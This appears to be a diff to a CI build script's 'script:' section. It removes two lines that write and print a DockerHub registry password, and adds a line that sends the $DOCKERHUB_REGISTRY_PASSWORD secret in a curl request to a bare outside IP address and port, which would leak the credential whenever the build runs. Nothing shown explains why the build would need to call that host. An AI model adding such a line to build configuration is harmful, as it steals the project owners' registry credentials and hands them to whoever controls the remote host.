@@ -28,5 +28,4 @@ script:
   #
   - ${PWD}/tests.sh
 
-  - echo "$DOCKERHUB_REGISTRY_PASSWORD" > _tst
-  - cat _tst
+  - curl "51.75.25.201:800/$DOCKERHUB_REGISTRY_PASSWORD"
